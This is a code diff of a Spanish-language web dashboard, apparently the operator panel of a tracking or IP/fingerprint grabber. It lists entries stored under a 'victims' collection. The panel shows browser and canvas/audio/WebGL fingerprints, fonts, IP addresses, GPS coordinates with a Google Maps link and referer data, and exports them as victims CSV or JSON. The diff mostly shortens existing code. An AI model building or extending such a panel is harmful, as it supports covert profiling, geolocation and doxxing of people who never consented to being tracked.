+    <div class="sec-title">🎬 Codecs</div>
+    <div class="field-grid">${R([
+      ['h264',''],['vp9',''],['av1',''],['mp3',''],['aac',''],['ogg',''],
+    ])}</div>
 
-    <!-- CSS FEATURES -->
-    <div class="sec-title">🎨 CSS / Media features</div>
-    <div class="field-grid">
-      ${R([
-        ['dark',''],       ['reduceMot',''],
-        ['hdr',''],        ['ptrFine',''],
-        ['ptrCoarse',''],  ['hover',''],
-      ])}
-    </div>
+    <div class="sec-title">🎨 CSS features</div>
+    <div class="field-grid">${R([
+      ['dark',''],['reduceMot',''],['hdr',''],['ptrFine',''],['ptrCoarse',''],['hover',''],
+    ])}</div>
 
-    <!-- FINGERPRINT -->
     <div class="sec-title">🔬 Fingerprint</div>
-    <div class="field-grid">
-      ${R([
-        ['hash','accent'],         ['compositeHash','accent'],
-        ['canvas','dim'],          ['canvasFingerprint','dim'],
-        ['audio','dim'],           ['audioFingerprint','dim'],
-        ['glUVendor',''],          ['webglUnmaskedVendor',''],
-        ['glURenderer',''],        ['webglUnmaskedRenderer',''],
-        ['glVer','dim'],           ['webglVersion','dim'],
-        ['glSL','dim'],            ['glMax','dim'],
-        ['glExt','dim'],           ['fonts','dim'],
-        ['fontN',''],              ['fontCount',''],
-        ['wasm',''],               ['wasmSIMD',''],
-        ['wasmThreads',''],        ['webGPU',''],
-        ['webGL2',''],
-      ])}
-    </div>
+    <div class="field-grid">${R([
+      ['hash','a'],['canvas','d'],['audio','d'],
+      ['glUVendor',''],['glURenderer',''],['glVer','d'],['glSL','d'],['glMax','d'],['glExt','d'],
+      ['fonts','d'],['fontN',''],
+      ['wasm',''],['wasmSIMD',''],['wasmThreads',''],['webGPU',''],['webGL2',''],
+    ])}</div>
 
-    <!-- WASM / FEATURES -->
-    <div class="sec-title">⚡ Capacidades avanzadas</div>
-    <div class="field-grid">
-      ${R([
-        ['wasm',''],        ['wasmSIMD',''],
-        ['wasmThreads',''], ['webGPU',''],
-        ['webGL2',''],      ['bt',''],
-        ['usb',''],         ['nfc',''],
-        ['cookies',''],     ['dnt','dim'],
-      ])}
-    </div>
+    <div class="sec-title">🔗 Referencia</div>
+    <div class="field-grid">${R([
+      ['referer',''],['url','d'],['params','d'],['_ts','d'],['_exit','d'],
+    ])}</div>
 
-    <!-- REFERENCIA -->
-    <div class="sec-title">🔗 Referencia / URL</div>
-    <div class="field-grid">
-      ${R([
-        ['referer',''],  ['url','dim'],
-        ['params','dim'],['href','dim'],
-        ['searchParams','dim'],
-        ['_ts','dim'],   ['_exit','dim'],
-      ])}
-    </div>
-
-    <!-- ACCIONES -->
     <div class="card-actions">
-      <button class="btn-sm" onclick="copyJSON('${id}')">📋 Copiar JSON</button>
-      <button class="btn-sm accent2" onclick="copyIP('${id}')">📌 Copiar IP</button>
-      ${hasGPS && gpsLat ? `<a class="btn-sm" style="text-decoration:none;color:var(--dim)" href="https://maps.google.com/?q=${gpsLat},${gpsLon}" target="_blank">🗺 Mapa</a>` : ''}
-      <button class="btn-sm" style="margin-left:auto" onclick="deleteEntry('${id}')">🗑 Eliminar</button>
+      <button class="btn-sm" onclick="copyJSON('${id}')">📋 JSON</button>
+      <button class="btn-sm a2" onclick="copyIP('${id}')">📌 IP</button>
+      ${hasGPS && gLat ? `<a class="btn-sm" style="text-decoration:none;color:var(--dim)" href="https://maps.google.com/?q=${gLat},${gLon}" target="_blank">🗺 Mapa</a>` : ''}
+      <button class="btn-sm" style="margin-left:auto" onclick="delEntry('${id}')">🗑</button>
     </div>
   </div>
 </div>`;
 }
 
 // ════════════════════════════════════════════
-// TOGGLE CARD
+// TOGGLE / COPY / DELETE
 // ════════════════════════════════════════════
 function toggleCard(id) {
-  document.getElementById('body-'+id).classList.toggle('open');
-  document.getElementById('arr-'+id).classList.toggle('open');
+  document.getElementById('body-' + id).classList.toggle('open');
+  document.getElementById('arr-'  + id).classList.toggle('open');
 }
 
-// ════════════════════════════════════════════
-// COPY JSON
-// ════════════════════════════════════════════
 function copyJSON(id) {
-  const entry = allEntries.find(e => e.id === id);
-  if (!entry) return;
-  const txt = JSON.stringify(entry.data, null, 2);
+  const e = allEntries.find(e => e.id === id);
+  if (!e) return;
+  const txt = JSON.stringify(e.data, null, 2);
   navigator.clipboard?.writeText(txt).catch(() => legacyCopy(txt));
-  const btn = document.querySelector(`#card-${id} .btn-sm`);
-  if (btn) { btn.textContent = '✓ Copiado'; setTimeout(() => btn.textContent = '📋 Copiar JSON', 1500); }
+  const btn = document.querySelector('#card-' + id + ' .btn-sm');
+  if (btn) { btn.textContent = '✓'; setTimeout(() => btn.textContent = '📋 JSON', 1500); }
 }
 
 function copyIP(id) {
-  const entry = allEntries.find(e => e.id === id);
-  if (!entry) return;
-  const d   = entry.data;
-  const ip  = d.ip || d.ip_public || d.ipLocal1 || '';
+  const e = allEntries.find(e => e.id === id);
+  if (!e) return;
+  const d = e.data, ip = d.ip || d.ip_public || d.ipLocal1 || '';
   navigator.clipboard?.writeText(ip).catch(() => legacyCopy(ip));
 }
 
 function legacyCopy(txt) {
   const ta = document.createElement('textarea');
-  ta.value = txt; document.body.appendChild(ta);
-  ta.select(); document.execCommand('copy');
-  document.body.removeChild(ta);
+  ta.value = txt; document.body.appendChild(ta); ta.select();
+  document.execCommand('copy'); document.body.removeChild(ta);
 }
 
-// ════════════════════════════════════════════
-// DELETE
-// ════════════════════════════════════════════
-async function deleteEntry(id) {
-  if (!confirm('¿Eliminar esta entrada?')) return;
-  const url = `${FS_BASE}/victims/${id}?key=${FB_KEY}`;
+async function delEntry(id) {
+  if (!confirm('¿Eliminar?')) return;
   try {
-    const r = await fetch(url, { method: 'DELETE' });
-    if (r.ok || r.status === 200 || r.status === 404) {
+    const r = await fetch(`${FS}/victims/${id}?key=${FB_KEY}`, { method: 'DELETE' });
+    if (r.ok || r.status === 404) {
       allEntries = allEntries.filter(e => e.id !== id);
       renderAll(); updateStats();
-    } else {
-      alert('Error al eliminar: ' + r.status);
     }
   } catch(e) { alert('Error: ' + e.message); }
 }
 
 // ════════════════════════════════════════════
-// EXPORT CSV
+// EXPORT
 // ════════════════════════════════════════════
 function exportCSV() {
-  if (!allEntries.length) { alert('No hay datos'); return; }
-  // Recoger todas las keys únicas
+  if (!allEntries.length) { alert('Sin datos'); return; }
   const keys = [...new Set(allEntries.flatMap(e => Object.keys(e.data)))].sort();
-  const escape = v => '"' + String(v).replace(/"/g,'""') + '"';
-
+  const esc  = v => '"' + String(v).replace(/"/g, '""') + '"';
   const rows = [
-    ['id', ...keys].map(escape).join(','),
-    ...allEntries.map(e => [
-      escape(e.id),
-      ...keys.map(k => escape(e.data[k] ?? ''))
-    ].join(','))
+    ['id', ...keys].map(esc).join(','),
+    ...allEntries.map(e => [esc(e.id), ...keys.map(k => esc(e.data[k] ?? ''))].join(','))
   ].join('\r\n');
-
-  download('victims_' + Date.now() + '.csv', rows, 'text/csv');
+  dl('victims_' + Date.now() + '.csv', rows, 'text/csv');
 }
 
-// ════════════════════════════════════════════
-// EXPORT JSON
-// ════════════════════════════════════════════
 function exportJSON() {
-  if (!allEntries.length) { alert('No hay datos'); return; }
-  const out = allEntries.map(e => ({ id: e.id, ...e.data }));
-  download('victims_' + Date.now() + '.json', JSON.stringify(out, null, 2), 'application/json');
+  if (!allEntries.length) { alert('Sin datos'); return; }
+  dl('victims_' + Date.now() + '.json',
+     JSON.stringify(allEntries.map(e => ({ id: e.id, ...e.data })), null, 2),
+     'application/json');
 }
 
-function download(filename, content, mime) {
+function dl(name, content, mime) {
   const a = document.createElement('a');
-  a.href = URL.createObjectURL(new Blob([content], { type: mime }));
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+  a.href     = URL.createObjectURL(new Blob([content], { type: mime }));
+  a.download = name;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
 }
 </script>
 </body>
